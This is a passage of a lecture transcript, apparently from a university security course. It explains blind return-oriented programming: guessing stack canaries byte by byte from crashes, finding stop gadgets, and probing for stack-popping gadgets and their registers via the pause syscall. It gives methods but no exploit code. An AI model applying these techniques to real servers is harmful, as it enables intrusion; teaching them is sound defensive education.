discuss at the end of lecture</text_slice>
            </slice>
            <slice>
              <time_slice>57:20</time_slice>
              <text_slice>some of the defenses you
can have against this,</text_slice>
            </slice>
            <slice>
              <time_slice>57:22</time_slice>
              <text_slice>but one very, abstractly
speaking civil defense,</text_slice>
            </slice>
            <slice>
              <time_slice>57:25</time_slice>
              <text_slice>is that when the
program crashes,</text_slice>
            </slice>
            <slice>
              <time_slice>57:28</time_slice>
              <text_slice>you catch the segfault
using a signal handler,</text_slice>
            </slice>
            <slice>
              <time_slice>57:30</time_slice>
              <text_slice>do not deduce you're
own code by the way.</text_slice>
            </slice>
            <slice>
              <time_slice>57:31</time_slice>
              <text_slice>But you can do this, right.</text_slice>
            </slice>
            <slice>
              <time_slice>57:33</time_slice>
              <text_slice>You catch that segfault
and then the signal handler</text_slice>
            </slice>
            <slice>
              <time_slice>57:35</time_slice>
              <text_slice>just keeps that
process alive for a bit</text_slice>
            </slice>
            <slice>
              <time_slice>57:37</time_slice>
              <text_slice>and that will trick the
attack into thinking that,</text_slice>
            </slice>
            <slice>
              <time_slice>57:39</time_slice>
              <text_slice>oh I won't get that signal
back, in other words.</text_slice>
            </slice>
            <slice>
              <time_slice>57:45</time_slice>
              <text_slice>OK so that's
basically how you can</text_slice>
            </slice>
            <slice>
              <time_slice>57:48</time_slice>
              <text_slice>guess the value for the canary.</text_slice>
            </slice>
            <slice>
              <time_slice>57:49</time_slice>
              <text_slice>And note that you can
actually use this attack</text_slice>
            </slice>
            <slice>
              <time_slice>57:51</time_slice>
              <text_slice>to sort of figure out
arbitrary values that</text_slice>
            </slice>
            <slice>
              <time_slice>57:54</time_slice>
              <text_slice>are low in the stack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>57:56</time_slice>
              <text_slice>Just by iteratively guessing
for each byte what it is,</text_slice>
            </slice>
            <slice>
              <time_slice>57:58</time_slice>
              <text_slice>and then using that
crash indication</text_slice>
            </slice>
            <slice>
              <time_slice>58:00</time_slice>
              <text_slice>as a signal of whether you're
guess was correct or not.</text_slice>
            </slice>
            <slice>
              <time_slice>58:04</time_slice>
              <text_slice>So that's basically
how you can defeat</text_slice>
            </slice>
            <slice>
              <time_slice>58:07</time_slice>
              <text_slice>these randomized
canaries, assuming</text_slice>
            </slice>
            <slice>
              <time_slice>58:09</time_slice>
              <text_slice>that after the server restarts,
those things are not changed.</text_slice>
            </slice>
            <slice>
              <time_slice>58:14</time_slice>
              <text_slice>And so we've also
shown how you can</text_slice>
            </slice>
            <slice>
              <time_slice>58:15</time_slice>
              <text_slice>use the gadgets
to string together</text_slice>
            </slice>
            <slice>
              <time_slice>58:17</time_slice>
              <text_slice>these more elaborate attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>58:19</time_slice>
              <text_slice>So what we're going
to look at next</text_slice>
            </slice>
            <slice>
              <time_slice>58:21</time_slice>
              <text_slice>is a way that you can use all
these techniques to defeat</text_slice>
            </slice>
            <slice>
              <time_slice>58:25</time_slice>
              <text_slice>data execution prevention,
address-based randomization</text_slice>
            </slice>
            <slice>
              <time_slice>58:29</time_slice>
              <text_slice>and canaries on a
production system.</text_slice>
            </slice>
            <slice>
              <time_slice>58:32</time_slice>
              <text_slice>Now what we're
going to do now is,</text_slice>
            </slice>
            <slice>
              <time_slice>58:34</time_slice>
              <text_slice>we're actually going
to start looking</text_slice>
            </slice>
            <slice>
              <time_slice>58:35</time_slice>
              <text_slice>at 64-bit architectures instead
of 32-bit architectures.</text_slice>
            </slice>
            <slice>
              <time_slice>58:38</time_slice>
              <text_slice>As it turns out for
randomization purposes,</text_slice>
            </slice>
            <slice>
              <time_slice>58:41</time_slice>
              <text_slice>64-bit architectures
actually give you</text_slice>
            </slice>
            <slice>
              <time_slice>58:43</time_slice>
              <text_slice>a lot more randomness to protect
yourself against the attacker.</text_slice>
            </slice>
            <slice>
              <time_slice>58:47</time_slice>
              <text_slice>So looking at attacks
is much more interesting</text_slice>
            </slice>
            <slice>
              <time_slice>58:49</time_slice>
              <text_slice>on those systems.</text_slice>
            </slice>
            <slice>
              <time_slice>58:50</time_slice>
              <text_slice>So that's also the type
of architecture that's</text_slice>
            </slice>
            <slice>
              <time_slice>58:52</time_slice>
              <text_slice>discussed in the BROP paper.</text_slice>
            </slice>
            <slice>
              <time_slice>58:54</time_slice>
              <text_slice>They talk about 64-bit machines.</text_slice>
            </slice>
            <slice>
              <time_slice>58:56</time_slice>
              <text_slice>So from now on,
assume that we're</text_slice>
            </slice>
            <slice>
              <time_slice>58:57</time_slice>
              <text_slice>going to talk about the
64-bit architectures.</text_slice>
            </slice>
            <slice>
              <time_slice>58:59</time_slice>
              <text_slice>For the purposes
of this discussion,</text_slice>
            </slice>
            <slice>
              <time_slice>59:01</time_slice>
              <text_slice>the only difference
between a 32-bit machine</text_slice>
            </slice>
            <slice>
              <time_slice>59:03</time_slice>
              <text_slice>and a 64-bit machine, is
that on a 32-bit machine,</text_slice>
            </slice>
            <slice>
              <time_slice>59:07</time_slice>
              <text_slice>the arguments are passed
on the stack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>59:10</time_slice>
              <text_slice>So here for example, this
is like a 32-bit machine</text_slice>
            </slice>
            <slice>
              <time_slice>59:14</time_slice>
              <text_slice>we were assuming, so
for example, bash path</text_slice>
            </slice>
            <slice>
              <time_slice>59:16</time_slice>
              <text_slice>will pass on the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>59:17</time_slice>
              <text_slice>On a 64-bit machine,
the arguments</text_slice>
            </slice>
            <slice>
              <time_slice>59:19</time_slice>
              <text_slice>are passed in registers instead.</text_slice>
            </slice>
            <slice>
              <time_slice>59:22</time_slice>
              <text_slice>OK so like when a
function starts execution,</text_slice>
            </slice>
            <slice>
              <time_slice>59:24</time_slice>
              <text_slice>it's going to look
in certain registers</text_slice>
            </slice>
            <slice>
              <time_slice>59:26</time_slice>
              <text_slice>to find where the arguments are.</text_slice>
            </slice>
            <slice>
              <time_slice>59:28</time_slice>
              <text_slice>OK, make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>59:29</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>59:30</time_slice>
              <text_slice>So start up here.</text_slice>
            </slice>
            <slice>
              <time_slice>59:41</time_slice>
              <text_slice>All right, so now we get to
the point of today's paper.</text_slice>
            </slice>
            <slice>
              <time_slice>59:45</time_slice>
              <text_slice>Which is the blind return
oriented programming.</text_slice>
            </slice>
            <slice>
              <time_slice>59:48</time_slice>
              <text_slice>So what's the first
thing you want to do,</text_slice>
            </slice>
            <slice>
              <time_slice>59:51</time_slice>
              <text_slice>if you want to engage in
BROP for fun or profit?</text_slice>
            </slice>
            <slice>
              <time_slice>59:54</time_slice>
              <text_slice>So the first thing
you have to do</text_slice>
            </slice>
            <slice>
              <time_slice>59:57</time_slice>
              <text_slice>is, you have to find what
they call a stop gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:06</time_slice>
              <text_slice>Now a stop gadget-- and remember
that when we say gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:10</time_slice>
              <text_slice>we essentially mean,
return addresses, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:13</time_slice>
              <text_slice>A gadget is identified
by the return address,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:15</time_slice>
              <text_slice>by the start address of that
sequence of instructions</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:18</time_slice>
              <text_slice>that we want to jump to, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:19</time_slice>
              <text_slice>So what is a stop gadget?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:21</time_slice>
              <text_slice>So a stop gadget is
essentially a return address</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:24</time_slice>
              <text_slice>to someplace in the code,
but if you jump to it,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:27</time_slice>
              <text_slice>you're going to
pause the program,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:29</time_slice>
              <text_slice>but you're not
going to crash it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:31</time_slice>
              <text_slice>OK, so that's why it's
called a stop gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:35</time_slice>
              <text_slice>Now what might that
stop gadget be?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:37</time_slice>
              <text_slice>You might jump to someplace
in the code that then calls</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:40</time_slice>
              <text_slice>via the sleep system call
for example, or does pause,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:43</time_slice>
              <text_slice>or something like that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:44</time_slice>
              <text_slice>Or maybe somehow the program
gets stuck in an infinite loop</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:46</time_slice>
              <text_slice>if you jump to that place.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:48</time_slice>
              <text_slice>Doesn't really matter
why the stop's happening,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:50</time_slice>
              <text_slice>but you could imagine
several scenarios which would</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:52</time_slice>
              <text_slice>cause that stop to take place.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:53</time_slice>
              <text_slice>So why is this useful?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:55</time_slice>
              <text_slice>Well once the
attacker has managed</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:57</time_slice>
              <text_slice>to defeat the canaries using
that iterative guessing</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:59</time_slice>
              <text_slice>technique I showed
you, he can start</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:02</time_slice>
              <text_slice>to overwrite this return
address and start probing</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:05</time_slice>
              <text_slice>for these stop gadgets, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:07</time_slice>
              <text_slice>And so note that
most of the random</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:09</time_slice>
              <text_slice>addresses you might
put there, they'll</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:12</time_slice>
              <text_slice>probably crash
the server, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:13</time_slice>
              <text_slice>Once again, that's the
message to you, the attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:15</time_slice>
              <text_slice>that's an indication that what
you found is not a stop gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:18</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:19</time_slice>
              <text_slice>Because when the server
crashes your sockets--</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:21</time_slice>
              <text_slice>your socket
connection is closed.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:22</time_slice>
              <text_slice>You as an attacker
know, OK that must not</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:23</time_slice>
              <text_slice>have been a stop gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:24</time_slice>
              <text_slice>Where if you guess something
and then you-- that socket still</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:27</time_slice>
              <text_slice>stays open for
awhile, you think,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:28</time_slice>
              <text_slice>aha I found that stop gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:31</time_slice>
              <text_slice>So that's the basic
idea behind step one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:33</time_slice>
              <text_slice>You got to find
that stop gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:36</time_slice>
              <text_slice>Now step two, is
that you want to find</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:42</time_slice>
              <text_slice>gadgets that pop stack entries.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:57</time_slice>
              <text_slice>And so you basically have to
use this sequence of carefully</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:02</time_slice>
              <text_slice>crafted instructions
to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:03</time_slice>
              <text_slice>when we've got one of
these stack gadgets.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:08</time_slice>
              <text_slice>So this sequence
is going to consist</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:10</time_slice>
              <text_slice>of a probe address, a stop
address, and a crash address.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:18</time_slice>
              <text_slice>So the probe
address is the thing</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:20</time_slice>
              <text_slice>that we're going to
put in the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:22</time_slice>
              <text_slice>This is going to be the address
of a potential stack popping</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:32</time_slice>
              <text_slice>gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:36</time_slice>
              <text_slice>This stop gadget is going to
be what we found in step one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:41</time_slice>
              <text_slice>So this is an address
of the stop gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:49</time_slice>
              <text_slice>And then the crash
gadget is just</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:51</time_slice>
              <text_slice>going to be the address
of nonexecutable code.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:02</time_slice>
              <text_slice>So for example, you
could just set this</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:03</time_slice>
              <text_slice>to, just the
address zero, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:06</time_slice>
              <text_slice>If you do a ret to this and
then try to execute code there,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:09</time_slice>
              <text_slice>this is going to
crash your program.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:11</time_slice>
              <text_slice>So we can basically use
these types of addresses</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:14</time_slice>
              <text_slice>to find out where these
stack popping gadgets are.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:17</time_slice>
              <text_slice>So here's a simple example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:20</time_slice>
              <text_slice>So let's write this over here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:24</time_slice>
              <text_slice>So let's say we have these two
different examples of a probe,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:31</time_slice>
              <text_slice>a trap, and then a stop, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:36</time_slice>
              <text_slice>So let's assume that
we have down here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:40</time_slice>
              <text_slice>we're going to probe
at some address,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:44</time_slice>
              <text_slice>doesn't really matter,
starts with a four,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:46</time_slice>
              <text_slice>ends with an eight.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:46</time_slice>
              <text_slice>That doesn't matter.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:47</time_slice>
              <text_slice>Over here, let's say that
we look at the address</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:50</time_slice>
              <text_slice>that, let's say starts
in a four ends in a C.</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:54</time_slice>
              <text_slice>So we're saying,
we're hypothesizing,</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:56</time_slice>
              <text_slice>that maybe one of
these two addresses</text_slice>
            </slice>
            <slice>
              <time_slice>1:03:59</time_slice>
              <text_slice>is going to be one of these
stack popping gadgets.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:02</time_slice>
              <text_slice>And then let's say
that the trap up here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:05</time_slice>
              <text_slice>like I said this is just
going to be address zero,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:10</time_slice>
              <text_slice>and then let's assume that we
found some preexisting stop</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:14</time_slice>
              <text_slice>gadget, some addresses start
the [INAUDIBLE] doesn't really</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:19</time_slice>
              <text_slice>matter.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:19</time_slice>
              <text_slice>And remember this stop gadget,
like maybe this address,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:24</time_slice>
              <text_slice>points to code that does
something like sleep 10,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:29</time_slice>
              <text_slice>or something like that, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:31</time_slice>
              <text_slice>So when I say that we're
going to test these sequences,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:33</time_slice>
              <text_slice>this is the stuff that we're
going to push onto the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:35</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:36</time_slice>
              <text_slice>So similar to over there, when
we were pushing these gadgets</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:40</time_slice>
              <text_slice>onto the stack,
this is the stuff</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:41</time_slice>
              <text_slice>that we're going to
push onto the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:42</time_slice>
              <text_slice>and we're going to see
what happens, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:45</time_slice>
              <text_slice>Now let's say that,
this code here, points</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:51</time_slice>
              <text_slice>to the following sequence.</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:53</time_slice>
              <text_slice>We're going to pop some
register, let's say racks,</text_slice>
            </slice>
            <slice>
              <time_slice>1:04:58</time_slice>
              <text_slice>and then we're going to return.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:03</time_slice>
              <text_slice>So what's going to happen here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:05</time_slice>
              <text_slice>Well so when the system
jumps this address,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:10</time_slice>
              <text_slice>the stack pointer's
going to move here, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:13</time_slice>
              <text_slice>Now we're in the middle
of this gadget, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:15</time_slice>
              <text_slice>What's the gadget going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:16</time_slice>
              <text_slice>It's going to pop racks, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:18</time_slice>
              <text_slice>Top of stack pointer's
now here, and it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:20</time_slice>
              <text_slice>going to return to whatever's
the top of the stack which</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:22</time_slice>
              <text_slice>is the stop gap, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:24</time_slice>
              <text_slice>So in this case this
gadget gets us to here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:29</time_slice>
              <text_slice>and the attacker
can tell that this</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:31</time_slice>
              <text_slice>is-- this probe address belong
to one of these pop stacking</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:34</time_slice>
              <text_slice>things, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:35</time_slice>
              <text_slice>Because the client
connection stays open.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:38</time_slice>
              <text_slice>Now let's say that
this gadget here,</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:41</time_slice>
              <text_slice>pointed to something
like the following.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:48</time_slice>
              <text_slice>Maybe it just does like
an xor, for example.</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:52</time_slice>
              <text_slice>So it's just going to xor
some registers and then it's</text_slice>
            </slice>
            <slice>
              <time_slice>1:05:58</time_slice>
              <text_slice>going to ret.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:00</time_slice>
              <text_slice>So what happens if we try
to jump to this gadget?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:02</time_slice>
              <text_slice>Right, note that this does not
pop anything off the stack, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:06</time_slice>
              <text_slice>It just changes the
contents of registers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:07</time_slice>
              <text_slice>So what's going to happen?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:09</time_slice>
              <text_slice>So we're going to
be here, we're going</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:11</time_slice>
              <text_slice>to jump to the address
of this gadget,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:13</time_slice>
              <text_slice>stack pointer goes here, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:15</time_slice>
              <text_slice>We're going to xor
these two things, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:18</time_slice>
              <text_slice>Stack pointer's not
going to change.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:19</time_slice>
              <text_slice>Then we're going to return to
whatever the top of the stack</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:22</time_slice>
              <text_slice>is, which is 0, 0.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:23</time_slice>
              <text_slice>This is going to crash.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:25</time_slice>
              <text_slice>OK, the client connection to
the server is going to close,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:28</time_slice>
              <text_slice>and as a result, the attacker
knows that this is not</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:31</time_slice>
              <text_slice>a stack popping gadget.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:34</time_slice>
              <text_slice>So does that all make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:35</time_slice>
              <text_slice>And so you can also
imagine that you can--</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:38</time_slice>
              <text_slice>by coming with more
baroque series of traps</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:42</time_slice>
              <text_slice>and stop gadgets
and stuff like that,</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:44</time_slice>
              <text_slice>you can find things that
for example, pop two things</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:46</time_slice>
              <text_slice>off the stack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:47</time_slice>
              <text_slice>You can just put another one
of these trap instructions</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:50</time_slice>
              <text_slice>there, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:51</time_slice>
              <text_slice>And so then unless
the-- unless this gadget</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:53</time_slice>
              <text_slice>pops two things
off, you're going</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:54</time_slice>
              <text_slice>to end up in one of these
traps and your code execution</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:56</time_slice>
              <text_slice>is going to blow up, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:06:58</time_slice>
              <text_slice>And so in the paper they discuss
like this thing called the BROP</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:02</time_slice>
              <text_slice>gadget, which is sort
of like hilariously</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:03</time_slice>
              <text_slice>complex if you're not used
to returning to programming.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:06</time_slice>
              <text_slice>What I'll show you today
is you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:08</time_slice>
              <text_slice>just use these very
simple pop gadgets</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:09</time_slice>
              <text_slice>to launch the same attack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:10</time_slice>
              <text_slice>Then hopefully after
you understand this,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:12</time_slice>
              <text_slice>the BROP gadget will
make more sense.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:14</time_slice>
              <text_slice>But does everyone
understand how we can probe</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:16</time_slice>
              <text_slice>for these little gadgets here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:19</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:20</time_slice>
              <text_slice>So, once you've got these
gadgets, what do you know?</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:26</time_slice>
              <text_slice>Well you found the location
of code snippets that</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:28</time_slice>
              <text_slice>allow you to pop stuff up,
one thing off the stack.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:31</time_slice>
              <text_slice>Precisely one thing
off the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:32</time_slice>
              <text_slice>but you don't actually
know into what register</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:35</time_slice>
              <text_slice>they're popping it into.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:37</time_slice>
              <text_slice>You just know that they're
getting popped off, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:40</time_slice>
              <text_slice>And you actually
need to know what</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:42</time_slice>
              <text_slice>register these gadgets
are popping stuff</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:44</time_slice>
              <text_slice>into, because remember,
on a 64-bit architecture,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:47</time_slice>
              <text_slice>the registers control where the
arguments are to this function</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:50</time_slice>
              <text_slice>that you want to invoke, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:52</time_slice>
              <text_slice>So the ultimate goal
to keep in mind,</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:54</time_slice>
              <text_slice>is that we want to be able
to create some gadgets that</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:56</time_slice>
              <text_slice>allow us to pop values
that we put on the stack</text_slice>
            </slice>
            <slice>
              <time_slice>1:07:58</time_slice>
              <text_slice>into certain registers,
and eventually we're</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:00</time_slice>
              <text_slice>going to call a system
call that's going to allow</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:02</time_slice>
              <text_slice>us to do something evil.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:03</time_slice>
              <text_slice>OK, so the next thing
that we need to do</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:05</time_slice>
              <text_slice>is determine which
registers-- so determine which</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:14</time_slice>
              <text_slice>registers the pop gadgets use.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:26</time_slice>
              <text_slice>So how are we going to do that?</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:28</time_slice>
              <text_slice>Well basically we can take
advantage of the pause system</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:32</time_slice>
              <text_slice>call.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:32</time_slice>
              <text_slice>OK, so the pause system call,
it takes no arguments, right.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:37</time_slice>
              <text_slice>And that means that it ignores
everything in the registers.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:40</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:41</time_slice>
              <text_slice>And essentially, to find
the pause instruction what</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:45</time_slice>
              <text_slice>we can do is, we can chain
all of these pop gadgets</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:49</time_slice>
              <text_slice>in such a way, that we put
all of them on the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:52</time_slice>
              <text_slice>in between each one of them
we put the syscall number</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:55</time_slice>
              <text_slice>for pause, and then we
see if we can actually</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:57</time_slice>
              <text_slice>get the program to hang.</text_slice>
            </slice>
            <slice>
              <time_slice>1:08:59</time_slice>
              <text_slice>Let me give you a
concrete example of that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:01</time_slice>
              <text_slice>So we'll do something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:09</time_slice>
              <text_slice>So here for the return address,
we'll put the following.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:24</time_slice>
              <text_slice>So let's say we have one
gadget that pops RDI register,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:28</time_slice>
              <text_slice>then does a ret.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:30</time_slice>
              <text_slice>And then up here we'll put
the syscall number for pause.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:40</time_slice>
              <text_slice>And then let's say that we have
another gadget that we found,</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:45</time_slice>
              <text_slice>that does a pop into a different
register, let's say RSI.</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:53</time_slice>
              <text_slice>And then we'll put the
system call number for pause</text_slice>
            </slice>
            <slice>
              <time_slice>1:09:58</time_slice>
              <text_slice>up here again.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:02</time_slice>
              <text_slice>And we do this for all the
gadgets that we've found</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:05</time_slice>
              <text_slice>and then eventually we put
the guest address for pause,</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:15</time_slice>
              <text_slice>or sorry for syscall, excuse me.</text_slice>
            </slice>
            <slice>
              <time_slice>1:10:25</time_slice>
              <text_slice>Once again, remember how you
invoke these system calls.</text_slice>
